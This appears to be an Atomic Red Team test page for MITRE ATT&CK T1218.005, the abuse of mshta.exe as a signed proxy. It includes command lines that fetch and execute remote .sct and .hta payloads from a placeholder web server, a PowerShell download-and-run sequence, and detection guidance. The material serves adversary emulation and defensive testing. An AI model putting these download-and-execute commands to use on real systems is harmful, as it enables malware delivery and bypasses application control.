# T1218.005 - Signed Binary Proxy Execution: Mshta
Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();
```

Invoke-AtomicTest T1218.005 -TestNumbers 1

### Atomic Test #2 - Mshta executes VBScript to execute malicious command
Run a local VB script to run local user enumeration powershell command.
This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
Upon execution, a new PowerShell windows will be opened that displays user information.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"":close")
```

Invoke-AtomicTest T1218.005 -TestNumbers 2

### Atomic Test #3 - Mshta Executes Remote HTML Application (HTA)
Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$var =Invoke-WebRequest "#{hta_url}"
$var.content|out-file "#{temp_file}"
mshta "#{temp_file}"
```

Invoke-AtomicTest T1218.005 -TestNumbers 3

## Detection
Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.

Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious